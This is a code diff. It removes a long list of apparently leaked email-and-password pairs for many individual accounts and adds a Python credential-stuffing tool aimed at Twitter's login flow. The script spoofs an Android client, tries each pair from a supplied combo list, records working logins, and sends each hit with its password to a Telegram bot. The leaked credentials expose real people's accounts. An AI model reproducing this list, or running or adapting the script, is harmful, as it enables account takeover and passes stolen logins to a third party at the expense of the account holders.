@@ -1,246 +1,425 @@
-eimuxgaming@gmail.com:Rasos15*
-sayat29@yahoo.com:romaram2206
-rickvijay@gmail.com:Ricky@2395
-cquintrel@gmail.com:cquinte
-26000609@sch.moe.edu.eg:26000609
-sutkovicvedad@gmail.com:123__Vedat*
-esam810@outlook.com:Sofa800832
-hmadonahmad@gmail.com:ahmad1hmadon2
-david10c@hotmail.com:adox3000
-vinicius.215.2016@hotmail.com:vinicius157
-nickanton2003@gmail.com:nicolasmaduro13
-uricaqaq@gmail.com:urica0208
-noonewillcares1994@gmail.com:noone1994
-luigigiuseppe@hotmail.it:Pa231005
-gmaltez0125@outlook.com:grace#0125
-rohanross97@gmail.com:pudzionawski981035
-eziokyden30@gmail.com:Jackie12345678910
-iam1121567935@hotmail.com:Hotmail1411
-lucianopablo204@outlook.com:lucianopablo19
-elizetejesus38@hotmail.com:[UNKNOWN
-shabanashraf512@hotmail.com:Babar@3161
-shreyasbabul215@gmail.com:Babul#215
-ghislain1@hotmail.com:sunfire2003
-asfoxyt@gmail.com:1464Alpha
-gianhernandez31@outlook.com:Ggs0987654321
-aamaab@hotmail.com:AHMAD3741
-portuguez_26@hotmail.com:Nutri2687*
-modgh@163.com:ly910315
-miguelangeldomingueztoribio@gmail.com:angel1406
-hs3lri@hotmail.com:Angsila01
-cygnusj@naver.com:q1w2e3!@#
-onir2@live.it:M@nutenzione1
-arturofdo@hotmail.com:Morenita18
-adriprochunatrelleszapata@gmail.com:adrian0708090802
-ltunesvarbu@gmail.com:dovfk1921
-ariel.laureano@comcast.net:Ihatewinter@2018
-alexbossmanmucha@gmail.com:Alex2020*0
-mr_niceguyf@hotmail.com:Hurerah19
-dovstraksys@hotmail.com:dovfk1921
-arturofdo1308@gmail.com:arturo78
-amar_zaha@hotmail.com:zahiragic96315912
-hmah11@hotmail.com:870808419123456
-dineshranga462@gmail.com:kasun1234
-retypanti@gmail.com:jemberindonesia
-elpuro13006@outlook.fr:12345cV%
-welber_camilo1991@outlook.com:welberrics@gmail.co
-michaelsmartpwfs@gmail.com:SchoolStuff1
-rodrigo.anacleto.m@outlook.com:rodrigothor2018
-swagaxel180@gmail.com:3927616514a
-boguh1@hotmail.com:gailuron2"
-nvillarroeltroncoso@gmail.com:tvn78516253
-trifoie6@gmail.com:profilo1
-jardiance2@hotmail.com:Empagliflozine1
-darkbrawler112@gmail.com:football002
-lorytedesco33@gmail.com:L0ry2003
-fortuaaron@gmail.com:BugattiStrangerThings1611
-noor.hazmer@gmail.com:Desperouza18
-radudanieliasmin@gmail.com:football002
-contacto@soportepcmedic.com:expertos
-aribo01@hotmail.com:Maya:83870???
-rodolfojv.fdz@outlook.com:rod741rod
-qwoqweqwo@gmail.com:17ag.2021
-i14@gmail.com:Steriantomi
-tasniaiffat271@gmail.com:Tasnia119271
-herbert-lameu@hotmail.com:salvatore2009
-a1061375430@hotmail.com:Hotmail1411
-i-p-o@live.fr:1aayoub-one1
-bernardodanielmoraes123@hotmail.com:be123lu321
-assersabry6@outlook.com:asser2021
-diniday374@gmail.com:Harry47348678901122
-ramonamitrofan@yahoo.com:gemeni2011
-marcin9902@interia.pl:oliwia2008
-ayomidefaith073@gmail.com:Ayomide23
-poweronventas@hotmail.com:guillermina2017
-heeyorii@hotmail.es:42157247
-a1061952444@hotmail.com:Hotmail1411
-bariskaya3535@gmail.com:Baris1990
-kdsthunderbolt@gmail.com:julanrover94
-sonyx79@hotmail.com:3774821M
-mr.jonnie@hotmail.com:0ldPassw0rd!
-tasinislam277@gmail.com:tasin1973b
-pedrinholukas22@gmail.com:pedrooloko12
-luluzinhojardim@hotmail.com:Joelma69
-trifoie6@gmail.com:profilo12
-lucaskanematsu2013@hotmail.com:banana123
-ericlucaflorentin0814@gmail.com:ericluca14
-maximilianoporres@live.com:mmm_E=lv-3260517
-gchoi18@knox.nsw.edu.au:7539518426
-gabcipat30@gmail.com:Gelo1215
-bolachadogame2@gmail.com:Jhuan12@1
-sidjerryusperry16@gmail.com:mariona102916
-naranjaconpan@gmail.com:elefante123
-yuykob@hotmail.com:as0917028864
-service@lecrantek.com:sce__95bvvmr
-projetos-artes@hotmail.com:123456789bira
-contact_craig_moore@yahoo.com:BtctG1zC@K01
-marcelo_100alemao@hotmail.com:Z@n401627101995
-henryescudero126@hotmail.es:10858419
-nurturing_hands@outlook.com:pooh6374
-jonathan.hellsing@outlook.com:Jonte0247
-antoniogio143@gmail.com:aliceadsl1@
-fikriadityafahmi.faf@gmail.com:Bandung1993
-omsanyambe@iway.na:s@nm07376mk
-bodnar.szabi15@gmail.com:bihjyt-maxqAh-4vippa
-jianyeruan@gmail.com:Kyle1207
-osanyambe@unam.na:s@nm07376mk
-anouarmchich1029@gmail.com:anouarmch16102008
-stardani1k@gmail.com:football002
-helison_face@outlook.com:He030115
-benjamin.mugisho@yahoo.fr:123Abellucci
-tarekeskander4@gmail.com:reham1997
-ken65176517@yahoo.com.tw:xl3fu3xl3fu3
-mdruzi@hotmail.com:Majstr1212
-2015230397@unfv.edu.pe:TRESCOPASYMAS52
-lopesgiovane@yahoo.com.br:fv8,vd321
-sandoq91@gmail.com:alo3alo5
-josejaviergazquez@gmail.com:JJgg1969
-gazquezjosej@gmail.com:Josej@1969
-iam1122172065@hotmail.com:Hotmail1411
-glassblower50@outlook.com:384rK5050
-Waadsoft.09@outlook.com:waadsoft.09@outlook.com
-valerinicolini04@gmail.com:Meliodas
-mark.dubie@hotmail.com:BITE12me**
-toy@live.cl:Anto2803
-foundgeorge41@gmail.com:dream7890
-kanokon5251@hotmail.com:Kanokon7
-vanlinh1211lop7a1@gmail.com:levanlinh1@
-minimojang8157@gmail.com:asd123789654
-abrahamer308@hotmail.com:29abril1970diana
-lolo_me32@hotmail.com:moonyday21
-reddog241@outlook.com:384rK987
-Lerchsilas154@gmail.com:Lerchj113
-asproac@hotmail.com:nicoleda7
-kadalitejaswi.147@gmail.com:kadali147
-cfrovramin@gmail.com:Raminaze2003
-miguelgtz2012@outlook.com:miguelito2012
-fishymars21@outlook.com:Carluan54
-simonavasile80@gmail.com:manu2008
-nedasis@hotmail.com:1328Mill#
-singh.aman.120995@outlook.com:Aman@120995
-tbnrwags@outlook.com:MadMax1978
-ashinivmekhala@gmail.com:ashi&yohan98
-a1117827731@hotmail.com:Hotmail1411
-meim3068@gmail.com:Mohamad@2019647114
-zakymir@hotmail.com:z@ky_7892597863_Z@KY
-besh444445@hotmail.com:Hotmail1411
-cdordoh@outlook.com:0809M.au_Li96
-maximiliano.porres@hotmail.com:mmm_E=html-3260517
-Ozturk.tunay@hotmail.com:031212052Rt
-dietrichcatherine123@hotmail.com:Rick2011
-dordohk@outlook.com:C.dordoh96
-augustingelurobu@gmail.com:alexy1982
-cdordoh@gmail.com:0809M.au_Li96
-alexramses1122@gmail.com:supercilious1122
-fjalcantara070500@gmail.com:1923317500Fj
-generson.li520@stenberg.college:1q2w3e4r5t6yqazwsxedcgli!
-luissantana38@hotmail.com:99934443@
-augustingelurobu@gmail.com:alexy1981
-fahimshaik19@gmail.com:fahim143
-brightlightmz@gmail.com:0741747974m
-anmolalinawab@outlook.com:@nmol123
-eljeddawie@gmail.com:Bodysaad2020
-jesseniahg0129@hotmail.com:jessenia0129
-niconicochatt@hotmail.com:pintita2006
-kaathiithaax_omara93@hotmail.com:omara12009
-a-elmogy@hotmail.com:0165670849
-jeanmagrinho@yahoo.com.br:pre90270
-kalfakisa@gmail.com:Aa97245515
-geometra@studio-cavigliani.it:BA10S21C1970
-asuraphenex@gmail.com:mongol2013
-antonin.richard73@gmail.com:Antonin120!
-rabindrakhatiwada369@outlook.com:R@9860#k
-mcronaldo_18@hotmail.com:101112
-manir_hossen_st@hotmail.com:Microsoft@0147258369bd
-hack346@gmail.com:Pushtyu346
-deeznuts589@yahoo.com:1qa2ws3ed4fr5gt
-oscar_e2000@hotmail.com:oscare
-vasamnang23@gmail.com:Love6868624@
-xandyxx43@gmail.com:N@tSn0wy
-sssss209@hotmail.com:Hotmail1411
-yarelis_moreno@hotmail.com:angeli$22
-arifrabbanibd2030@outlook.com:01683420047@
-cblack1104@outlook.com:Maddy123!
-a1106845470@hotmail.com:Hotmail14111
-adencussell2006@outlook.com:?
-xandyxx43@gmail.com:N@tSn0wyL@re
-chaiyapat430@gmail.com:Dong19052545
-bywallacelopes@gmail.com:##P3t3l3k0
-fragarul_2017@yahoo.com:Alphabravo112
-Voicu0721@gmail.com:ionut123456789.
-muthu021@outlook.com:muthu@456
-jirkabartos15@gmail.com:Plechovka2711
-dleiahmusic@hotmail.com:Rayado007
-apgo13@hotmail.com:670513edward
-voicu0721@gmail.com:ionut1234
-laurinha.bonini@hotmail.com:primavera18
-tomasterian@gmail.com:9441237
-menamarindavid@gmail.com:mastodonte1
-jasperwillemvisser@gmail.com:Beauvisser123#
-matinemarati@gmail.com:matin1388
-rovilsonfragata@hotmail.com:vICTOR00!
-batzoriganand0104@gmail.com:Anand0103_
-tadde.taiz21@gmail.com:Puzzette7
-andrem.odama@gmail.com:yx6hhgcm
-aplaza25@hotmail.com:El.jefazo1
-a1105636151@hotmail.com:Hotmail1411
-andreialira.silva@outlook.com:perola15
-edy_nik8@yahoo.com:Popanicolae33
-awesome-o92@live.com.mx:Fegelein1!!
-iteccruzkr@gmail.com:kenritchmond
-niyumal2020@gmail.com:A61823660
-mitchelregts4@gmail.com:Politie112!NL
-maxiporres.houses@outlook.com:pepotesolo-3600
-hendrawijana@gmail.com:Angel0702
-godcoco123@outlook.com:Xzaviion12
-paulojluz@outlook.com:SeMaPePa243@
-kuok718@hotmail.com:omg1WTF11
-fady50434@gmail.com:fady@2019
-crisbasulto29@hotmail.com:Progreso245
-hamza22ansari22@gmail.com:Hamza654321@
-giuseppejohn@icloud.com:Giu090308
-freddy_mib@hotmail.com:LIGERjediforcefjr1984
-account3322@mcalts.net:03131143542nadeem
-ionutyfyt5@gmail.com:ionut123456789@
-ruselvhai@gmail.com:552807mrs@##@
-mshoaib929@hotmail.com:786Allah
-emo0608@yahoo.com:0000_1111
-samueldavid0182@gmail.com:Jorge3050
-camiloguerrerogl@outlook.com:carpatoz07
-renetting@gmail.com:4052907t-2uvf
-ingenieroalbornoz@hotmail.com:SebastianAlbornoz1979
-s3k9.plus@gmail.com:Lolek2984#
-ccarlos678pvp@gmail.com:carlosam74655108
-garlitobarloy@hotmail.com:anzonigz
-ccarlos678pvp@outlook.com:carlospvp123456789
-abdoussalamg@yahoo.com:2894Djafarou#
-dileepaswin10@gmail.com:wz9ua3f9tz
-deepjain038@outlook.com:qwerty123@#
-lt4505@hotmail.com:tu1412
-4@hotmail.com:242414ey
-muhammadfiqrihadiramadhan@gmail.com:fiqrihadi123
-samuelbrega@outlook.com.br:samuel654
-leopacifico80@hotmail.com:jujuba10
-call.meh.rinako.kun@gmail.com:gogoletsgoletsgodateko
-hyogi218@gmail.com:Buatapaan
-jorgealbertobava@hotmail.com:emiliocachilo
+import requests
+import json
+import os
+import random
+import time
+from rich import print as L7N
+from rich.panel import Panel as L7N2
+from rich.console import Console
+L7n = Console()
+
+def Wait():
+    with L7n.status('[bold white]''please wait ',spinner_style='point'):
+        time.sleep(6)
+        L7N1 = '\n[bold blue] Abd'
+        L7N(L7N1)
+Wait()
+
+
+abd = (
+      'https://t.me/PersonalHost/25',
+      'https://t.me/PersonalHost/23',
+      'https://t.me/PersonalHost/22',
+      'https://t.me/PersonalHost/21',
+      'https://t.me/PersonalHost/18')
+abed = random.choice(abd)
+
+E = '\033[1;31m'
+G = '\033[1;35m'
+Z = '\033[1;31m'  # احمر
+X = '\033[1;33m'  # اصفر
+Z1 = '\033[2;31m'  # احمر ثاني
+F = '\033[2;32m'  # اخضر
+A = '\033[2;34m'  # ازرق
+C = '\033[2;35m'  # وردي
+B = '\x1b[38;5;208m'  # برتقالي
+Y = '\033[1;34m'  # ازرق فاتح
+M = '\x1b[1;37m'  # ابیض
+S = '\033[1;33m'
+
+bss = 0
+uus = 0
+hit = 0
+bad = 0
+
+token = input('ToKeN > ')
+ID = input('iD > ')
+
+
+bss = 0
+hit = 0
+bad = 0
+
+def VeT():
+    try:       
+        Access = requests.post("https://api.twitter.com/oauth2/token", data= "grant_type=client_credentials", headers = {
+  'User-Agent': "TwitterAndroid/10.68.1-release.0 (310681000-r-0) Redmi+Note+8+Pro/11 (Xiaomi;Redmi+Note+10+Pro;Redmi;begonia;0;;0;2016)",
+  'Accept': "application/json",
+  'Accept-Encoding': "br, gzip, deflate",
+  'Content-Type': "application/x-www-form-urlencoded",
+  'timezone': "Asia/Aden",
+  'os-security-patch-level': "2022-04-01",
+  'optimize-body': "true",
+  'x-twitter-client': "TwitterAndroid",
+  'x-attest-token': "no_token",
+  'x-twitter-client-adid': "20d041fe-7911-446c-9a92-035ed8ab0904",
+  'x-twitter-client-language': "ar-EG",
+  'x-client-uuid': "7032db5b-591f-4f73-842b-2f9e52516871",
+  'x-twitter-client-deviceid': "137d1fbe27f7dc2d",
+  'authorization': "Basic M25WdVNvQlpueDZVNHZ6VXhmNXc6QmNzNTlFRmJic2RGNlNsOU5nNzFzbWdTdFdFR3dYWEtTall2UFZ0N3F5cw==",
+  'x-twitter-client-version': "10.68.1-release.0",
+  'cache-control': "no-store",
+  'x-twitter-active-user': "no",
+  'x-twitter-api-version': "5",
+  'x-twitter-client-limit-ad-tracking': "0",
+  'x-b3-traceid': "dbffbe7a8d609493",
+  'accept-language': "ar-EG",
+  'x-twitter-client-flavor': ""
+}).json()["access_token"]
+        headers = {
+  'User-Agent': "TwitterAndroid/10.68.1-release.0 (310681000-r-0) Redmi+Note+8+Pro/11 (Xiaomi;Redmi+Note+8+Pro;Redmi;begonia;0;;0;2016)",
+  'Accept': "application/json",  
+  'Content-Type': "application/json", 
+  'authorization': f"Bearer {Access}", 
+  'system-user-agent': "Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011)",
+}
+
+        gs = requests.post("https://api.twitter.com/1.1/guest/activate.json", headers=headers).json()["guest_token"]
+        try:
+            os.remove("Twitter.txt")
+        except:
+            pass
+        with open("Twitter.txt", "w") as f:
+            f.write(f"{Access}✓{gs}")
+
+    except Exception as e:
+        print(f"Erorr: {e}")
+        VeT()  
+
+
+
+
+
+
+
+def Login(user, pas):
+    global hit, bad, bss
+    try:
+        with open("Twitter.txt", "r") as f:
+            cc = f.read().strip()
+            Access, gs = cc.split("✓")
+    except:
+        VeT()
+        with open("Twitter.txt", "r") as f:
+            cc = f.read().strip()
+            Access, gs = cc.split("✓")
+
+
+    try:
+        headers = {
+  'User-Agent': "TwitterAndroid/10.68.1-release.0 (310681000-r-0) Redmi+Note+8+Pro/11 (Xiaomi;Redmi+Note+8+Pro;Redmi;begonia;0;;0;2016)",
+  'Accept': "application/json",  
+  'Content-Type': "application/json", 
+  'authorization': f"Bearer {Access}", 
+  'x-guest-token': gs,
+  'system-user-agent': "Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011)",
+}
+        response = requests.post("https://api.twitter.com/1.1/onboarding/task.json", params = {
+  'flow_name': "login",
+  'api_version': "1",
+  'known_device_token': "",
+  'sim_country_code': "ye"
+}, data=json.dumps({
+  "input_flow_data": {
+    "country_code": None,
+    "flow_context": {
+      "referrer_context": {
+        "referral_details": "utm_source=google-play&utm_medium=organic",
+        "referrer_url": ""
+      },
+      "start_location": {
+        "location": "splash_screen"
+      }
+    },
+    "requested_variant": None,
+    "target_user_id": 0
+  },
+  "subtask_versions": {
+    "generic_urt": 3,
+    "standard": 1,
+    "open_home_timeline": 1,
+    "app_locale_update": 1,
+    "enter_date": 1,
+    "email_verification": 3,
+    "deregister_device": 1,
+    "enter_password": 5,
+    "enter_text": 6,
+    "one_tap": 2,
+    "cta": 7,
+    "single_sign_on": 1,
+    "fetch_persisted_data": 1,
+    "enter_username": 3,
+    "web_modal": 2,
+    "fetch_temporary_password": 1,
+    "menu_dialog": 1,
+    "sign_up_review": 5,
+    "user_recommendations_urt": 3,
+    "in_app_notification": 1,
+    "sign_up": 2,
+    "typeahead_search": 1,
+    "app_attestation": 1,
+    "user_recommendations_list": 4,
+    "cta_inline": 1,
+    "contacts_live_sync_permission_prompt": 3,
+    "choice_selection": 5,
+    "js_instrumentation": 1,
+    "alert_dialog_suppress_client_events": 1,
+    "privacy_options": 1,
+    "topics_selector": 1,
+    "wait_spinner": 3,
+    "tweet_selection_urt": 1,
+    "end_flow": 1,
+    "settings_list": 7,
+    "open_external_link": 1,
+    "phone_verification": 5,
+    "security_key": 3,
+    "select_banner": 2,
+    "upload_media": 1,
+    "web": 2,
+    "alert_dialog": 1,
+    "open_account": 2,
+    "passkey": 1,
+    "action_list": 2,
+    "enter_phone": 2,
+    "open_link": 1,
+    "show_code": 1,
+    "update_users": 1,
+    "check_logged_in_account": 1,
+    "enter_email": 2,
+    "select_avatar": 4,
+    "location_permission_prompt": 2,
+    "notifications_permission_prompt": 4
+  }
+}), headers=headers)
+
+        AT = (response.headers)['att']
+        tok = response.json()["flow_token"]
+        headers.update({'att': AT})
+        res = requests.post("https://api.twitter.com/1.1/onboarding/task.json", data=json.dumps({
+  "flow_token": tok,
+  "subtask_inputs": [
+    {
+      "enter_text": {
+        "challenge_response": None,
+        "suggestion_id": None,
+        "text": user,
+        "link": "next_link"
+      },
+      "subtask_id": "LoginEnterUserIdentifier"
+    }
+  ],
+  "subtask_versions": {
+    "generic_urt": 3,
+    "standard": 1,
+    "open_home_timeline": 1,
+    "app_locale_update": 1,
+    "enter_date": 1,
+    "email_verification": 3,
+    "deregister_device": 1,
+    "enter_password": 5,
+    "enter_text": 6,
+    "one_tap": 2,
+    "cta": 7,
+    "single_sign_on": 1,
+    "fetch_persisted_data": 1,
+    "enter_username": 3,
+    "web_modal": 2,
+    "fetch_temporary_password": 1,
+    "menu_dialog": 1,
+    "sign_up_review": 5,
+    "user_recommendations_urt": 3,
+    "in_app_notification": 1,
+    "sign_up": 2,
+    "typeahead_search": 1,
+    "app_attestation": 1,
+    "user_recommendations_list": 4,
+    "cta_inline": 1,
+    "contacts_live_sync_permission_prompt": 3,
+    "choice_selection": 5,
+    "js_instrumentation": 1,
+    "alert_dialog_suppress_client_events": 1,
+    "privacy_options": 1,
+    "topics_selector": 1,
+    "wait_spinner": 3,
+    "tweet_selection_urt": 1,
+    "end_flow": 1,
+    "settings_list": 7,
+    "open_external_link": 1,
+    "phone_verification": 5,
+    "security_key": 3,
+    "select_banner": 2,
+    "upload_media": 1,
+    "web": 2,
+    "alert_dialog": 1,
+    "open_account": 2,
+    "passkey": 1,
+    "action_list": 2,
+    "enter_phone": 2,
+    "open_link": 1,
+    "show_code": 1,
+    "update_users": 1,
+    "check_logged_in_account": 1,
+    "enter_email": 2,
+    "select_avatar": 4,
+    "location_permission_prompt": 2,
+    "notifications_permission_prompt": 4
+  }
+}), headers=headers)
+        if "flow_token" in res.text:
+            tok2 = res.json()["flow_token"]
+            req = requests.post("https://api.twitter.com/1.1/onboarding/task.json", data=json.dumps({
+  "flow_token": tok2,
+  "subtask_inputs": [
+    {
+      "enter_password": {
+        "password": pas,
+        "link": "next_link"
+      },
+      "subtask_id": "LoginEnterPassword"
+    }
+  ],
+  "subtask_versions": {
+    "generic_urt": 3,
+    "standard": 1,
+    "open_home_timeline": 1,
+    "app_locale_update": 1,
+    "enter_date": 1,
+    "email_verification": 3,
+    "deregister_device": 1,
+    "enter_password": 5,
+    "enter_text": 6,
+    "one_tap": 2,
+    "cta": 7,
+    "single_sign_on": 1,
+    "fetch_persisted_data": 1,
+    "enter_username": 3,
+    "web_modal": 2,
+    "fetch_temporary_password": 1,
+    "menu_dialog": 1,
+    "sign_up_review": 5,
+    "user_recommendations_urt": 3,
+    "in_app_notification": 1,
+    "sign_up": 2,
+    "typeahead_search": 1,
+    "app_attestation": 1,
+    "user_recommendations_list": 4,
+    "cta_inline": 1,
+    "contacts_live_sync_permission_prompt": 3,
+    "choice_selection": 5,
+    "js_instrumentation": 1,
+    "alert_dialog_suppress_client_events": 1,
+    "privacy_options": 1,
+    "topics_selector": 1,
+    "wait_spinner": 3,
+    "tweet_selection_urt": 1,
+    "end_flow": 1,
+    "settings_list": 7,
+    "open_external_link": 1,
+    "phone_verification": 5,
+    "security_key": 3,
+    "select_banner": 2,
+    "upload_media": 1,
+    "web": 2,
+    "alert_dialog": 1,
+    "open_account": 2,
+    "passkey": 1,
+    "action_list": 2,
+    "enter_phone": 2,
+    "open_link": 1,
+    "show_code": 1,
+    "update_users": 1,
+    "check_logged_in_account": 1,
+    "enter_email": 2,
+    "select_avatar": 4,
+    "location_permission_prompt": 2,
+    "notifications_permission_prompt": 4
+  }
+}), headers=headers)
+
+            if "user" in req.text and "id" in req.text:
+                hit += 1
+                import random
+                tlg = f"""
+New Hit 🐊
+    UserName > {user}
+    PassWord > {pas}
+By @kckkkkc
+"""
+                print(F + tlg)
+                with open("Hits_combo.txt", "a") as f:
+                    f.write(tlg + "\n")
+               # Send message with random video
+                requests.post(f"https://api.telegram.org/bot{token}/sendvideo?chat_id={ID}&video={abed}&caption="+str(tlg))
+                os.system('cls' if os.name == 'nt' else 'clear')
+                print(f"""
+{F}Hits > {F}{hit}
+{Z}BadLogin > {Z}{bad}
+{X}NotFoundUser > {X}{bss}
+{A}Email > {M}{user} | {A}PassWord > {M}{pas}
+""")    
+
+            else:
+                bad += 1
+                os.system('cls' if os.name == 'nt' else 'clear')
+                print(f"""
+{F}Hits > {F}{hit}
+{Z}BadLogin > {Z}{bad}
+{X}NotFoundUser > {X}{bss}
+{A}Email > {M}{user} | {A}PassWord > {M}{pas}
+""")    
+        elif "not find your account." in res.text:
+            bss += 1
+            os.system('cls' if os.name == 'nt' else 'clear')
+            print(f"""
+{F}Hits > {F}{hit}
+{Z}BadLogin > {Z}{bad}
+{X}NotFoundUser > {X}{bss}
+{A}Email > {M}{user} | {A}PassWord > {M}{pas}
+""")    
+        else:
+            bad += 1
+            os.system('cls' if os.name == 'nt' else 'clear')
+            print(f"""
+{F}Hits > {F}{hit}
+{Z}BadLogin > {Z}{bad}
+{X}NotFoundUser > {X}{bss}
+{A}Email > {M}{user} | {A}PassWord > {M}{pas}
+""")    
+            VeT()
+
+    except Exception as e:
+        print(f"Erorr: {e}")
+
+def fileget():
+    file = input('[+] ENTER YOUR COMBO LIST : ')
+    print("_" * 60)
+    try:
+        with open(file, "r") as f:
+            for line in f:
+                try:
+                    if ':' in line:
+                        user, pas = line.strip().split(':', 1)
+                    elif '|' in line:
+                        user, pas = line.strip().split('|', 1)
+                    else: 
+                        continue
+                    Login(user, pas)
+                except Exception as e:                    
+                    print(f"Error: {line.strip()} | {e}")
+                    continue
+    except FileNotFoundError:
+        print("File not found. Please enter a valid file name.")
+        fileget()
+
+fileget()
+
